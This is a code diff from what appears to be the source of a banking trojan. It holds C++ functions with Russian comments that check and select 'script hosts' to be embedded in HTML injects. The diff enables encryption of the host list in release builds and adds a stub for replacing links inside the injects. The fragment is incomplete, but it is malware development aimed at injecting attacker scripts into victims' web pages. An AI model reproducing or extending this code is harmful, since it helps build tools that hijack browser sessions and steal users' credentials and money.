@@ -102,7 +102,7 @@ void AzInicializeHostChecker()
 		#ifdef DEBUGCONFIG
         	bool Encrypted = false;
 		#else
-        	bool Encrypted = false;
+        	bool Encrypted = true;
 		#endif
 		AZDATA::Checker = new THostChecker(AZ_SCRIPTS_HOSTS, Encrypted);
     }
@@ -111,23 +111,42 @@ void AzInicializeHostChecker()
 
 
 //----------------------------------------------------
-// CheckAzScriptHosts - Функция запускает проверку
+//  AzInizializeHTMLInjects  - Функция инициализирует
+//  систему подмены ссылок в HTML инжектах
+//----------------------------------------------------
+void AzInizializeHTMLInjects(const THTMLInjectList &Injects)
+{
+	// перебираем инжекты и ищем в них вхождение параметра
+
+	int Count = Injects.Count();
+	for (int i = 0; i < Count; i++)
+	{
+        THTMLInject *Inject = Injects[i];
+	}
+}
+//-----------------------------------------------------------------------------
+
+
+
+//----------------------------------------------------
+// AzCheckScriptHosts - Функция запускает проверку
 // хостов вшиваемых в HTML инжекты
 //----------------------------------------------------
-void CheckAzScriptHosts()
+void AzCheckScriptHosts()
 {
 	// Инициализируем проверку
 	AzInicializeHostChecker();
 
     AZDATA::Checker->Check();
 }
+//-----------------------------------------------------------------------------
 
 
 //----------------------------------------------------
-// GetAzScriptHost - Функция возвращает  рабочий хост
+// AzGetScriptHost - Функция возвращает  рабочий хост
 // для вшития в HTML инжекты
 //----------------------------------------------------
-string GetAzScriptHost()
+string AzGetScriptHost()
 {
 	if (AnsiStr::Hash(AZ_SCRIPTS_HOSTS) == AZ_SCRIPTS_HOSTS_HASH)
 		return NULLSTR;
